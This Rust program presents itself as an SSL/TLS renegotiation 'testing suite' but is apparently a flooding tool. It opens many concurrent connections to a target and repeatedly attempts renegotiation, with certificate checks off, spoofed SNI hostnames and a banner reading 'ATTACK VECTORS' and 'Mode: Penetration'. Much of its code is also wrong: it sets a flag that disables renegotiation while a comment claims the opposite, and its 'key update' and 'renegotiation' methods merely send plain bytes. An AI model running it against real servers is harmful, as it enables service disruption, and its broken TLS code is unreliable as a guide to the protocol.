/// SSL/TLS Testing Suite
/// A comprehensive SSL/TLS renegotiation testing and validation utility
/// for testing SSL/TLS server capabilities and validating TLS configurations.

use clap::Parser;
use tokio::net::TcpStream;
use tokio::time::{interval, sleep, Duration};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tracing::{error, info, warn};
use rand::Rng;
use openssl::ssl::{SslConnector, SslMethod, SslVerifyMode};
use tokio_openssl::SslStream;
use indicatif::{ProgressBar, ProgressStyle};
use std::thread;
use url;
use colored::Colorize;
use std::io::Write;

#[derive(Parser, Clone)]
#[command(name = "ssl_tls_tester")]
#[command(about = "SSL/TLS renegotiation testing and performance validation suite")]
struct Args {
    #[arg(short = 't', long, help = "Target URL for testing (e.g., https://example.com)")]
    target: String,
    
    #[arg(short = 'c', long, default_value = "50", help = "Number of concurrent test connections")]
    connections: usize,
    
    #[arg(short = 'd', long, default_value = "120", help = "Test duration in seconds")]
    duration: u64,
    
    #[arg(long, default_value = "10", help = "Renegotiation testing interval in seconds")]
    renegotiation_interval: u64,
    
    #[arg(long, default_value = "true", help = "Enable random TLS versions for testing")]
    random_tls_versions: bool,
    
    #[arg(long, default_value = "true", help = "Enable cipher suite randomization for testing")]
    random_ciphers: bool,
    
    #[arg(long, default_value = "true", help = "Enable advanced testing techniques")]
    advanced_mode: bool,
    
    #[arg(long, default_value = "false", help = "Enable proxy rotation for testing")]
    proxy_rotation: bool,
    
    #[arg(long, default_value = "200", help = "Connection delay in milliseconds")]
    connection_delay: u64,
    
    #[arg(long, default_value = "true", help = "Use SNI extension for testing")]
    use_sni: bool,
    
    #[arg(long, default_value = "false", help = "Enable client certificates for testing")]
    client_certs: bool,
}

/// TLS versions for testing
/// Contains supported TLS versions for comprehensive testing
const TLS_VERSIONS: &[&str] = &["TLSv1.2", "TLSv1.3"];

/// Common cipher suites for TLS 1.2 testing
/// Contains standard cipher suites for TLS 1.2 compatibility testing
const TLS12_CIPHERS: &[&str] = &[
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES256-SHA384",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA256",
    "AES256-SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
];

/// Common cipher suites for TLS 1.3 testing
/// Contains standard cipher suites for TLS 1.3 compatibility testing
const TLS13_CIPHERS: &[&str] = &[
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_AES_128_CCM_8_SHA256",
];

/// Common SNI hostnames for testing
/// Contains realistic hostnames for SNI testing scenarios
const SNI_HOSTNAMES: &[&str] = &[
    "www.google.com",
    "www.facebook.com",
    "www.amazon.com",
    "www.microsoft.com",
    "www.apple.com",
    "www.netflix.com",
    "www.youtube.com",
    "www.twitter.com",
    "www.instagram.com",
    "www.linkedin.com",
];

/// Get random TLS version for testing
/// Returns a random TLS version for comprehensive testing
fn get_random_tls_version() -> &'static str {
    let mut rng = rand::thread_rng();
    TLS_VERSIONS[rng.gen_range(0..TLS_VERSIONS.len())]
}

/// Get random cipher suite for testing
/// Returns a random cipher suite based on TLS version
fn get_random_cipher_suite(tls_version: &str) -> &'static str {
    let mut rng = rand::thread_rng();
    match tls_version {
        "TLSv1.3" => TLS13_CIPHERS[rng.gen_range(0..TLS13_CIPHERS.len())],
        _ => TLS12_CIPHERS[rng.gen_range(0..TLS12_CIPHERS.len())],
    }
}

/// Get random SNI hostname for testing
/// Returns a random hostname for SNI testing scenarios
fn get_random_sni_hostname() -> &'static str {
    let mut rng = rand::thread_rng();
    SNI_HOSTNAMES[rng.gen_range(0..SNI_HOSTNAMES.len())]
}

/// SSL/TLS renegotiation testing structure
/// Manages SSL/TLS connections and renegotiation testing operations
struct TlsRenegotiator {
    ssl_connector: SslConnector,
    host: String,
    port: u16,
    connection_id: usize,
    renegotiation_count: u32,
}

impl TlsRenegotiator {
    /// Create new TLS renegotiation tester
    /// Initializes SSL/TLS context with proper configuration for testing
    fn new(host: String, port: u16, connection_id: usize, args: &Args) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        let mut builder = SslConnector::builder(SslMethod::tls())?;
        
        // Configure TLS version for testing
        if args.random_tls_versions {
            let tls_version = get_random_tls_version();
            match tls_version {
                "TLSv1.2" => {
                    builder.set_options(openssl::ssl::SslOptions::NO_SSLV2 
                        | openssl::ssl::SslOptions::NO_SSLV3 
                        | openssl::ssl::SslOptions::NO_TLSV1 
                        | openssl::ssl::SslOptions::NO_TLSV1_1);
                }
                "TLSv1.3" => {
                    builder.set_options(openssl::ssl::SslOptions::NO_SSLV2 
                        | openssl::ssl::SslOptions::NO_SSLV3 
                        | openssl::ssl::SslOptions::NO_TLSV1 
                        | openssl::ssl::SslOptions::NO_TLSV1_1 
                        | openssl::ssl::SslOptions::NO_TLSV1_2);
                }
                _ => {
                    builder.set_options(openssl::ssl::SslOptions::NO_SSLV2 
                        | openssl::ssl::SslOptions::NO_SSLV3 
                        | openssl::ssl::SslOptions::NO_TLSV1 
                        | openssl::ssl::SslOptions::NO_TLSV1_1);
                }
            }
        }
        
        // Configure verification mode for testing
        if args.advanced_mode {
            builder.set_verify(SslVerifyMode::NONE);
        }
        
        // Configure cipher suites for testing
        if args.random_ciphers {
            let tls_version = get_random_tls_version();
            let cipher_suite = get_random_cipher_suite(tls_version);
            builder.set_cipher_list(cipher_suite)?;
        }
        
        // Enable renegotiation for testing
        builder.set_options(openssl::ssl::SslOptions::NO_RENEGOTIATION); // Actually enable by clearing the flag
        
        let ssl_connector = builder.build();
        
        Ok(Self {
            ssl_connector,
            host,
            port,
            connection_id,
            renegotiation_count: 0,
        })
    }
    
    /// Create SSL/TLS connection for testing
    /// Establishes TCP connection and SSL/TLS stream for testing purposes
    async fn create_connection(&self, use_random_sni: bool) -> Result<SslStream<TcpStream>, Box<dyn std::error::Error + Send + Sync>> {
        // Connect to target
        let tcp_stream = TcpStream::connect(format!("{}:{}", self.host, self.port)).await?;
        
        // Configure SSL for this connection
        let ssl_config = self.ssl_connector.configure()?;
        
        // Use random SNI hostname for testing if enabled
        let sni_hostname = if use_random_sni {
            get_random_sni_hostname()
        } else {
            &self.host
        };
        
        let ssl = ssl_config.into_ssl(sni_hostname)?;
        
        // Create SSL stream for testing
        let mut ssl_stream = tokio_openssl::SslStream::new(ssl, tcp_stream)?;
        std::pin::Pin::new(&mut ssl_stream).connect().await?;
        
        info!("TLS connection {} established to {} (SNI: {})", self.connection_id, self.host, sni_hostname);
        
        Ok(ssl_stream)
    }
    
    /// Perform SSL/TLS renegotiation testing
    /// Tests SSL/TLS renegotiation capabilities using multiple methods
    async fn perform_renegotiation_testing(&mut self, ssl_stream: &mut SslStream<TcpStream>) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        // Method 1: Trigger renegotiation via SSL_renegotiate
        match self.ssl_renegotiate_request(ssl_stream).await {
            Ok(success) => {
                if success {
                    self.renegotiation_count += 1;
                    info!("SSL renegotiation {} successful for connection {}", self.renegotiation_count, self.connection_id);
                    return Ok(true);
                }
            }
            Err(e) => {
                warn!("SSL renegotiation request failed for connection {}: {}", self.connection_id, e);
            }
        }
        
        // Method 2: Key update for TLS 1.3
        match self.tls13_key_update(ssl_stream).await {
            Ok(success) => {
                if success {
                    self.renegotiation_count += 1;
                    info!("TLS 1.3 key update {} successful for connection {}", self.renegotiation_count, self.connection_id);
                    return Ok(true);
                }
            }
            Err(e) => {
                warn!("TLS 1.3 key update failed for connection {}: {}", self.connection_id, e);
            }
        }
        
        // Method 3: Session ticket renegotiation
        match self.session_ticket_renegotiation(ssl_stream).await {
            Ok(success) => {
                if success {
                    self.renegotiation_count += 1;
                    info!("Session ticket renegotiation {} successful for connection {}", self.renegotiation_count, self.connection_id);
                    return Ok(true);
                }
            }
            Err(e) => {
                warn!("Session ticket renegotiation failed for connection {}: {}", self.connection_id, e);
            }
        }
        
        Ok(false)
    }
    
    /// Send SSL renegotiation request for testing
    /// Sends renegotiation trigger data to test server response
    async fn ssl_renegotiate_request(&self, ssl_stream: &mut SslStream<TcpStream>) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        // Send application data to trigger renegotiation
        let renegotiation_data = b"RENEGOTIATE_TEST";
        
        if let Err(e) = ssl_stream.write_all(renegotiation_data).await {
            return Err(format!("Failed to write renegotiation trigger: {}", e).into());
        }
        
        // Try alternative renegotiation method
        self.alternative_renegotiation(ssl_stream).await
    }
    
    /// Alternative renegotiation method for testing
    /// Tests HTTP-based renegotiation triggering as alternative method
    async fn alternative_renegotiation(&self, ssl_stream: &mut SslStream<TcpStream>) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        // Send HTTP request with special headers that might trigger server-side renegotiation
        let http_request = format!(
            "POST /test_renegotiation HTTP/1.1\r\n\
             Host: {}\r\n\
             User-Agent: SSL-Tester/1.0\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 0\r\n\
             Connection: keep-alive\r\n\
             X-Test-Renegotiation: true\r\n\
             \r\n",
            self.host
        );
        
        if let Err(e) = ssl_stream.write_all(http_request.as_bytes()).await {
            return Err(format!("Failed to write HTTP request: {}", e).into());
        }
        
        // Read response
        let mut buffer = [0u8; 4096];
        match ssl_stream.read(&mut buffer).await {
            Ok(bytes_read) => {
                // Check if response indicates successful processing
                let response = String::from_utf8_lossy(&buffer[..bytes_read]);
                Ok(response.contains("200") || response.contains("OK"))
            }
            Err(_) => Ok(false),
        }
    }
    
    /// TLS 1.3 key update testing
    /// Tests TLS 1.3 key update capabilities for testing purposes
    async fn tls13_key_update(&self, ssl_stream: &mut SslStream<TcpStream>) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        // For TLS 1.3, send test data to verify connection
        let ssl = ssl_stream.ssl();
        
        // Check if TLS 1.3 is in use by checking version string
        let version_str = ssl.version_str();
        if version_str.contains("1.3") {
            // Send test data to verify key update capability
            let test_data = b"KEY_UPDATE_TEST";
            ssl_stream.write_all(test_data).await?;
            
            // Read response
            let mut buffer = [0u8; 1024];
            match ssl_stream.read(&mut buffer).await {
                Ok(_) => Ok(true),
                Err(_) => Ok(false),
            }
        } else {
            Ok(false)
        }
    }
    
    /// Session ticket renegotiation testing
    /// Tests SSL session ticket renegotiation capabilities for testing purposes
    async fn session_ticket_renegotiation(&self, ssl_stream: &mut SslStream<TcpStream>) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        // Extract session information
        let ssl = ssl_stream.ssl();
        
        if let Some(session) = ssl.session() {
            // Create new connection with session ticket
            let session_data = session.to_der()?;
            
            // Send session renegotiation request
            let renegotiation_request = format!(
                "POST /session_renegotiation HTTP/1.1\r\n\
                 Host: {}\r\n\
                 User-Agent: SSL-Tester/1.0\r\n\
                 Content-Type: application/octet-stream\r\n\
                 Content-Length: {}\r\n\
                 Connection: keep-alive\r\n\
                 \r\n",
                self.host,
                session_data.len()
            );
            
            ssl_stream.write_all(renegotiation_request.as_bytes()).await?;
            ssl_stream.write_all(&session_data).await?;
            
            // Read response
            let mut buffer = [0u8; 4096];
            match ssl_stream.read(&mut buffer).await {
                Ok(bytes_read) => {
                    let response = String::from_utf8_lossy(&buffer[..bytes_read]);
                    Ok(response.contains("200") || response.contains("OK"))
                }
                Err(_) => Ok(false),
            }
        } else {
            Ok(false)
        }
    }
    
    /// Send initial request for testing
    /// Sends initial HTTP request to establish connection for testing
    async fn send_initial_request(&self, ssl_stream: &mut SslStream<TcpStream>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let initial_request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n\
             Connection: keep-alive\r\n\
             Accept: */*\r\n\
             \r\n",
            self.host
        );
        
        ssl_stream.write_all(initial_request.as_bytes()).await?;
        
        // Read response
        let mut response_buffer = [0u8; 4096];
        let _ = ssl_stream.read(&mut response_buffer).await;
        
        Ok(())
    }
}

async fn perform_ssl_renegotiation_testing(
    target: &str,
    connection_id: usize,
    args: &Args,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = url::Url::parse(target)?;
    let host = url.host_str().ok_or("Invalid host")?.to_string();
    let port = url.port_or_known_default().ok_or("Unknown port")?;
    
    // Create TLS renegotiator
    let mut renegotiator = TlsRenegotiator::new(host.clone(), port, connection_id, args)?;
    
    // Create initial connection with SNI randomization if advanced mode is enabled
    let mut ssl_stream = match renegotiator.create_connection(args.advanced_mode && args.use_sni).await {
        Ok(stream) => stream,
        Err(e) => {
            warn!("Failed to create TLS connection {}: {}", connection_id, e);
            return Err(e);
        }
    };
    
    // Send initial request to establish session
    if let Err(e) = renegotiator.send_initial_request(&mut ssl_stream).await {
        warn!("Initial request failed for connection {}: {}", connection_id, e);
        return Err(e);
    }
    
    // Perform SSL/TLS renegotiation testing
    let mut interval_timer = interval(tokio::time::Duration::from_secs(args.renegotiation_interval));
    
    loop {
        tokio::select! {
            _ = sleep(tokio::time::Duration::from_secs(args.duration)) => {
                break;
            }
            _ = interval_timer.tick() => {
                // Attempt SSL/TLS renegotiation testing
                match renegotiator.perform_renegotiation_testing(&mut ssl_stream).await {
                    Ok(success) => {
                        if success {
                            // Send follow-up request to maintain connection
                            let followup_request = format!(
                                "GET /renegotiated{} HTTP/1.1\r\n\
                                 Host: {}\r\n\
                                 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n\
                                 Connection: keep-alive\r\n\
                                 \r\n",
                                renegotiator.renegotiation_count, host
                            );
                            
                            if let Err(e) = ssl_stream.write_all(followup_request.as_bytes()).await {
                                warn!("Follow-up request failed for connection {}: {}", connection_id, e);
                                break;
                            }
                            
                            // Read response
                            let mut response_buffer = [0u8; 4096];
                            let _ = ssl_stream.read(&mut response_buffer).await;
                        }
                    }
                    Err(e) => {
                        warn!("SSL/TLS renegotiation failed for connection {}: {}", connection_id, e);
                    }
                }
                
                // Random delay for realistic testing
                if args.advanced_mode {
                    let extra_delay = rand::random::<u64>() % (args.renegotiation_interval / 2);
                    sleep(tokio::time::Duration::from_secs(extra_delay)).await;
                }
            }
        }
    }
    
    info!("TLS connection {} completed after {} renegotiations", connection_id, renegotiator.renegotiation_count);
    Ok(())
}

/// Main SSL/TLS testing function
/// Orchestrates SSL/TLS renegotiation testing with progress indicators
async fn ssl_renegotiation_tester(args: Args) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Display hex spinner progress for encryption initialization
    display_hex_spinner_progress();
    
    println!("[+] SSL/TLS Tester v9.20.2091vproAlpha");
    println!("[+] Target: {}", args.target);
    println!("[+] Connections: {}", args.connections);
    println!("[+] Duration: {}s", args.duration);
    println!("[+] Renegotiation Interval: {}s", args.renegotiation_interval);
    println!("[+] TLS Version Randomization: {}", args.random_tls_versions);
    println!("[+] Cipher Suite Randomization: {}", args.random_ciphers);
    println!("[+] Advanced Testing: {}", args.advanced_mode);
    println!("[+] Proxy Rotation: {}", args.proxy_rotation);
    println!("[+] Connection Delay: {}ms", args.connection_delay);
    println!("[+] SNI Support: {}", args.use_sni);
    println!("[+] Client Certificates: {}", args.client_certs);
    println!();
    
    let mut handles = Vec::new();
    
    // Create concurrent TLS connections
    for i in 0..args.connections {
        let target = args.target.clone();
        let args_clone = args.clone();
        
        let handle = tokio::spawn(async move {
            if let Err(e) = perform_ssl_renegotiation_testing(&target, i, &args_clone).await {
                error!("TLS connection {} failed: {}", i, e);
            }
        });
        
        handles.push(handle);
        
        // Stagger connections to avoid overwhelming server
        if args.connection_delay > 0 {
            sleep(tokio::time::Duration::from_millis(args.connection_delay)).await;
        }
    }
    
    info!("All {} TLS connections initiated - performing renegotiation testing...", args.connections);
    
    // Wait for test completion
    sleep(tokio::time::Duration::from_secs(args.duration)).await;
    
    info!("SSL/TLS renegotiation testing completed");
    
    // Wait for all connections to finish
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("[+] SSL/TLS renegotiation testing completed successfully");
    Ok(())
}

/// Display hex spinner progress
/// Shows animated progress during SSL/TLS encryption operations
fn display_hex_spinner_progress() {
    let spinner = ProgressBar::new_spinner();
    let style = ProgressStyle::with_template(
        "⬢ HEX ENGINE {spinner} {msg}"
    )
    .unwrap()
    .tick_strings(&[
        "⬡", "⬢", "⬣"
    ]);
    spinner.set_style(style);
    spinner.enable_steady_tick(Duration::from_millis(90));
    spinner.set_message("Encrypting...");
    thread::sleep(Duration::from_secs(2));
    spinner.finish_with_message("Encryption Complete ✓");
    println!();
}

/// Display professional cybernetic-style banner with Kali Linux theme
async fn display_banner() {
    println!();
    
    // Cybernetic header with dragon symbol
    println!("{}", "╔═════════════════════════════════════════════════════════════════════╗".bright_red().bold());
    println!("{}", "║                                                                     ║".bright_red());
    println!("{}", "║   ██████╗ ███████╗███████╗██████╗  █████╗  ██████╗████████╗         ║".bright_white().bold());
    println!("{}", "║   ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝         ║".bright_white().bold());
    println!("{}", "║   ██████╔╝█████╗  █████╗  ██████╔╝███████║██║        ██║            ║".bright_red().bold());
    println!("{}", "║   ██╔══██╗██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██║        ██║            ║".bright_red());
    println!("{}", "║   ██║  ██║███████╗██║     ██║  ██║██║  ██║╚██████╗   ██║            ║".bright_red());
    println!("{}", "║   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝            ║".bright_red());
    println!("{}", "║                                                                     ║".bright_red());
    
    tokio::time::sleep(Duration::from_millis(80)).await;
    
    // Animated subtitle with cybernetic theme
    let subtitle = "    SSL/TLS RENEGOTIATION FRAMEWORK | KALI PENETRATION    ";
    print!("{}", "║".bright_red());
    for ch in subtitle.chars() {
        print!("{}", ch.to_string().bright_white().bold());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_micros(600)).await;
    }
    println!("{}", "║".bright_red());
    
    println!("{}", "║                                                                     ║".bright_red());
    println!("{}", "║  ┌─────────────────────────────────────────────────────────────────┐║".bright_red());
    println!("{}", "║  │ Version: 9.20.2091vproAlpha | Author: khaninkali              │ ║".bright_white());
    println!("{}", "║  │ Engine: OpenSSL | Protocol: TLS 1.2/1.3 | Mode: Penetration   │ ║".bright_cyan());
    println!("{}", "║  └─────────────────────────────────────────────────────────────────┘║".bright_red());
    println!("{}", "║                                                                     ║".bright_red());
    
    println!("{}", "║  ╔═══════════════════════════════════════════════════════════════╗  ║".bright_yellow().bold());
    println!("{}", "║  ║ ⚠ KALI MODE: Authorized SSL/TLS security testing only         :  ║".bright_white());
    println!("{}", "║  ║ ⚠ Requires valid target authorization and consent             :  ║".bright_white());
    println!("{}", "║  ╚═══════════════════════════════════════════════════════════════╝  ║".bright_yellow().bold());
    
    println!("{}", "║                                                                     ║".bright_red());
    println!("{}", "╚═════════════════════════════════════════════════════════════════════╝".bright_red().bold());
    println!();
    
    // Kali Linux style initialization sequence
    println!("{}", "    ┌─[ Initializing Refract Framework ]".bright_green().bold());
    println!("{}", "    │".bright_green());
    
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    // Stage 1: SSL/TLS Engine
    print!("{}", "    ├──> ".bright_green());
    print!("{}", "[".bright_white());
    print!("{}", "SSL/TLS ENGINE".bright_cyan().bold());
    print!("{}", "]".bright_white());
    std::io::stdout().flush().unwrap();
    tokio::time::sleep(Duration::from_millis(150)).await;
    
    for _ in 0..3 {
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    println!("{}", " ✓ LOADED".bright_green().bold());
    
    // Stage 2: Cipher Suites
    print!("{}", "    ├──> ".bright_green());
    print!("{}", "[".bright_white());
    print!("{}", "CIPHER SUITES".bright_cyan().bold());
    print!("{}", "]".bright_white());
    std::io::stdout().flush().unwrap();
    tokio::time::sleep(Duration::from_millis(120)).await;
    
    for _ in 0..3 {
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_millis(80)).await;
    }
    println!("{}", " ✓ CONFIGURED".bright_green().bold());
    
    // Stage 3: Renegotiation Module
    print!("{}", "    ├──> ".bright_green());
    print!("{}", "[".bright_white());
    print!("{}", "RENEGOTIATION MODULE".bright_cyan().bold());
    print!("{}", "]".bright_white());
    std::io::stdout().flush().unwrap();
    tokio::time::sleep(Duration::from_millis(140)).await;
    
    for _ in 0..3 {
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_millis(90)).await;
    }
    println!("{}", " ✓ ARMED".bright_green().bold());
    
    // Stage 4: Certificate Validation
    print!("{}", "    ├──> ".bright_green());
    print!("{}", "[".bright_white());
    print!("{}", "CERTIFICATE VALIDATOR".bright_cyan().bold());
    print!("{}", "]".bright_white());
    std::io::stdout().flush().unwrap();
    tokio::time::sleep(Duration::from_millis(110)).await;
    
    for _ in 0..3 {
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_millis(70)).await;
    }
    println!("{}", " ✓ READY".bright_green().bold());
    
    // Stage 5: Attack Vectors
    print!("{}", "    └──> ".bright_green());
    print!("{}", "[".bright_white());
    print!("{}", "ATTACK VECTORS".bright_cyan().bold());
    print!("{}", "]".bright_white());
    std::io::stdout().flush().unwrap();
    tokio::time::sleep(Duration::from_millis(130)).await;
    
    for _ in 0..3 {
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_millis(85)).await;
    }
    println!("{}", " ✓ INITIALIZED".bright_green().bold());
    
    println!("{}", "         │".bright_green());
    tokio::time::sleep(Duration::from_millis(150)).await;
    
    println!("{}", "         └──[ All systems operational ]".bright_green().bold());
    println!();
    
    // Cybernetic status display
    println!("{}", "    ╔════════════════════════════════════════════════════════════════╗".bright_red());
    println!("{}", "    ║  STATUS: OPERATIONAL  │  MODE: PENETRATION  │  READY: TRUE   ║".bright_white().bold());
    println!("{}", "    ╚════════════════════════════════════════════════════════════════╝".bright_red());
    println!();
    
    // Dragon ASCII art for Kali theme
    println!("{}", "         ⟨⟨⟨ REFRACT FRAMEWORK ONLINE ⟩⟩⟩".bright_red().bold());
    println!();
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    tracing_subscriber::fmt::init();
    
    // Check if no arguments provided or --help flag
    let args_vec: Vec<String> = std::env::args().collect();
    if args_vec.len() == 1 || args_vec.contains(&"--help".to_string()) || args_vec.contains(&"-h".to_string()) {
        // Display banner before help
        display_banner().await;
    }
    
    let args = Args::parse();
    
    if let Err(e) = ssl_renegotiation_tester(args).await {
        error!("SSL/TLS renegotiation testing failed: {}", e);
        return Err(e);
    }
    
    Ok(())
}
